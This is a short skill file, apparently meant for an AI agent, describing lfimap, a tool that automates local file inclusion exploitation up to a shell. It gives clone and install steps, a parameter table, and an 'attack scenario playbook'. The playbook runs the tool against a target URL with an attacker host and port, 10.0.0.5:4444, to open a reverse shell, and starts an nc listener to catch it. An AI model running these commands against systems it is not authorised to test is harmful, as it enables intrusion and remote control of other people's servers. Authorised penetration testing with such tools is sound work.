---
name: lfimap-lfi-autopwn
description: "lfimap automates LFI discovery to shell. Signals: web vulnerability, injection, LFI scanning, automatic reverse shell, test all parameters."
zh-signals: "lfimap: 自动化 LFI 到 shell。信号:web漏洞,注入,LFI 扫描,自动反弹 shell,强制所有参数测试。"
---

# lfimap

- 攻击大类:C09 Web利用(LFI)
- 上游仓库:https://github.com/hansmach1ne/lfimap
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/hansmach1ne/lfimap && cd lfimap && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 lfimap.py -U 'https://t.com/?file=welcome'` | LFI 扫描 |
| `--exploit -U url --lhost 10.0.0.5 --lport 4444` | 自动反弹 shell |
| `-F` | 强制所有参数测试 |
| `--rfi` | 启用 RFI 测试 |
| `--force-ssl` | 强制 HTTPS |
| `-C 'PHPSESSID=xxx'` | 带 Cookie |

## 攻击场景 Playbook

### 自动化 LFI 到 shell

```bash
python3 lfimap.py -U 'https://t.com/include.php?module=home' --exploit --lhost 10.0.0.5 --lport 4444
# nc -lvnp 4444 等待连接
```

## 注意事项

集成 data://、日志、/proc/self/fd、RFI 全链路的 LFI 自动化工具,比手工路径遍历省心。
